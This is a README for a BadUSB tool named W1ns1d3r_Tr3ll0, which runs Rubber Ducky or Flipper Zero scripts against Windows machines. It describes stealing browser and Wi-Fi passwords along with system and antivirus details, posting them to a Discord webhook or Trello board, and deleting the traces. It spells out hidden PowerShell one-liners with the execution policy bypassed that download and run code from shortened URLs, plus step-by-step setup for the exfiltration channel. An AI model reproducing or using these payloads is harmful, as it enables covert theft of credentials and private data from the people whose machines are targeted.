# W1ns1d3r_Tr3ll0 BadUSB

## Description

This project is a BadUSB mix of some rubber ducky scripts.

- **Version:** [1.0]
- **Average Time :** 
  - W1ns1d3r_f4st_Tr3ll0 : 3 Secs
  - W1ns1d3r_st4gg3d_Tr3ll0 : 30 secs
- **Target:** Windows 10/11 (7/8 not tested)
- **Supported Layout keyboard:** US/FR/DE
- **Author:** [b1g_ph4rm4](https://github.com/Gvte-Kali/BadStuffHosting)

```
______________________________________________________________________________________________

 888      d888                             888          d8888                            d8888  
 888     d8888                             888         d8P888                           d8P888  
 888       888                             888        d8P 888                          d8P 888  
 88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
 888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
 888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
 888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
 88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
                     888          888                                                           
                Y8b d88P          888
                 "Y88P"           888                                                           
______________________________________________________________________________________________
```

- **Credits:**
  - [![blobs0](https://img.shields.io/badge/blobs0-Ultimate%20Flipper%20Grabber-brightgreen)](https://github.com/blobs0/Ultimate-Flipper-Grabber)
  - [![I-am-jakoby](https://img.shields.io/badge/I--am--jakoby-Discord%20Webhooks%20Functions-blue)](https://github.com/I-am-jakoby)
  - [![UNCOV3R3D](https://img.shields.io/badge/UNCOV3R3D-Statut-orange)](https://github.com/UNC0V3R3D)
  - 7h30th3r0n3
  - moosehadley

## Features 

**W1ns1d3r_st4gg3d_Tr3ll0:** 
- The informations the script pulls :
    - Stage 1 :
        - Web browser passwords
    - Stage 2 :
        - Antivirus software and version
        - User informations
        - System informations
        - Wifi passwords
- Post everything in your discord webhook
- Notes : The program works on the C:\temp directory and deletes it when the files are uploaded.
  
**W1ns1d3r_F4st_Tr3ll0** 
- Don't get the administrative privileges on target.
- Sets the working directory to C:\temp.
- The informations the script pulls :
    - Stage 2 :
        - Antivirus software and version
        - Hardware informations
        - System informations
        - Wifi passwords
- Post everything in your discord webhook
- Notes : The program works on the C:\temp directory and deletes it when the files are uploaded.
  
## How to use
- To get the Trello API working with your scripts, you'll need to get some configuration before using it : 
  - **The ID of the list you want to post into --> Step 1.6**
  - **An API Key --> Step 1.4.3**
  - **A Token --> Step 1.4.5**

- **Setup Guide :**
  - **1 - Creating account and setup informations**
    - 1.1 - Create an account on this link : https://id.atlassian.com/login?application=trello

    - 1.2 - Go to your boards, this url should look like this : https://trello.com/u/yourusername/boards

    - 1.3 - Create a board

    - 1.4 - Go on https://trello.com/power-ups/admin and create a new power-up.
      - 1.4.1 - On creation, the only useful thing is to locate it into the worksapce where your board was created ( should only be one workspace if it's a new account ).
      - 1.4.2 - Go to your newly created Power-UP. Now go to API Key and click the "generate API Key".
      - 1.4.3 - **!! VERY IMPORTANT !!** You need to note somewhere the API Key. 
      - 1.4.4 - **!! VERY IMPORTANT !!**  On the API Key page, click on the token button, and authorize Trello to use your account.
      - 1.4.5 - **!! VERY IMPORTANT !!** You need to note the token, should look like *ATTAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*.
      - 1.4.6 - Go to your Power-UP *Capabilities* menu and make sure that it gets every authorization.

    - 1.5 - Go on the board you created, the url should look like this : "https://trello.com/b/xxxxxxx/name_of_your_board"

    - 1.6 - Use the idlist script : 
      - 1.6.1 - For linux users, go for the idlist.sh
      - 1.6.2 - For windows users, go for the idlist.ps1

  - **2 - Once you have the idlist, the API key and the token, you need to modify the script or the [.txt] file**
    - 2.1 - Modifying the script, you need to add this into it ( Upload-Trello function ): 
      - $idList = "THE_ID_LIST"
      - $key = "YOUR_API_KEY_FROM"
      - $token = "YOUR_TOKEN_FROM"

    - 2.2 - Modifying the [.txt] file : 
      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/wBFLV | iex``` for W1ns1d3r_f4st_Tr3ll0 ( line 23 )
      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/gpvF5 | iex``` for W1ns1d3r_st4gg3d_Tr3ll0 ( line 53 )

    - **3 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero**

    - **4 - Enjoy !**

# Releases

- **Version [1.0]** - *10/02/2024*
